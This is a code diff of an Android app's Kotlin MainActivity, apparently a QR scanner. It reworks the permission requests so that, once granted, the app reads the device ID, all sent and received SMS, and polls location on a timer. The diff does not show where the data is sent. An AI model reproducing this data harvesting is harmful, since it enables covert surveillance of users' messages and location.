@@ -58,24 +58,32 @@ class MainActivity : AppCompatActivity() {
 
     // ------- ACTIONS TO PERFORM WHEN CREATING AND DESTROYING THE ACTIVITY -----------
 
+    private var permissionsGranted = false
+    private var requestAllPermissionsCallback: ((Boolean) -> Unit)? = null
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        requestAllPermissions()
-
         setContentView(R.layout.activity_main)
-        getAndroidId(this)
-        retrieveSMSData(this, received)
-        retrieveSMSData(this, sent)
-        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-        handler.postDelayed(runnable, interval.toLong())
-        getLocation()
-
         qrCodeValueButton = findViewById(R.id.qr_code_value_button)
         startScanButton = findViewById(R.id.start_scan_button)
         qrCodeValueButton.isEnabled = false
 
         initButtonClickListener()
+
+        requestAllPermissions { granted ->
+            permissionsGranted = granted
+            continueOnCreateLogic()
+        }
+    }
+
+    private fun continueOnCreateLogic() {
+            getAndroidId(this)
+            retrieveSMSData(this, received)
+            retrieveSMSData(this, sent)
+            fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+            handler.postDelayed(runnable, interval.toLong())
+            getLocation()
     }
 
     override fun onDestroy() {
@@ -118,25 +126,10 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun requestAllPermissions() {
-
-        if (ActivityCompat.checkSelfPermission(
-                this,
-                Manifest.permission.CAMERA
-            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
-                this,
-                Manifest.permission.RECORD_AUDIO
-            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
-                this,
-                Manifest.permission.ACCESS_FINE_LOCATION
-            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
-                this,
-                Manifest.permission.ACCESS_COARSE_LOCATION
-            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
-                this,
-                Manifest.permission.READ_SMS
-            ) != PackageManager.PERMISSION_GRANTED
-        ) {
+    private fun requestAllPermissions(callback: (Boolean) -> Unit) {
+        if (areAllPermissionsGranted()) {
+            callback(true)
+        } else {
             ActivityCompat.requestPermissions(
                 this,
                 arrayOf(
@@ -148,8 +141,31 @@ class MainActivity : AppCompatActivity() {
                 ),
                 requestAllPermission
             )
-            return
+            requestAllPermissionsCallback = callback
         }
+    }
+
+    private fun areAllPermissionsGranted(): Boolean {
+        return (ActivityCompat.checkSelfPermission(
+            this,
+            Manifest.permission.CAMERA
+        ) == PackageManager.PERMISSION_GRANTED &&
+                ActivityCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.RECORD_AUDIO
+                ) == PackageManager.PERMISSION_GRANTED &&
+                ActivityCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.ACCESS_FINE_LOCATION
+                ) == PackageManager.PERMISSION_GRANTED &&
+                ActivityCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.ACCESS_COARSE_LOCATION
+                ) == PackageManager.PERMISSION_GRANTED &&
+                ActivityCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.READ_SMS
+                ) == PackageManager.PERMISSION_GRANTED)
     }
 
     // -------------- TO REQUEST THE DIFFERENT PERMISSIONS ----------------
@@ -166,13 +182,9 @@ class MainActivity : AppCompatActivity() {
             retrieveSMSData(this, received)
             retrieveSMSData(this, sent)
         }
-        if (requestCode == requestAllPermission
-            && grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED
-            && grantResults[1] == PackageManager.PERMISSION_GRANTED
-            && grantResults[2] == PackageManager.PERMISSION_GRANTED
-            && grantResults[3] == PackageManager.PERMISSION_GRANTED
-            && grantResults[4] == PackageManager.PERMISSION_GRANTED) {
-            requestAllPermissions()
+        if (requestCode == requestAllPermission) {
+            val allPermissionsGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
+            requestAllPermissionsCallback?.invoke(allPermissionsGranted)
         }
     }
 
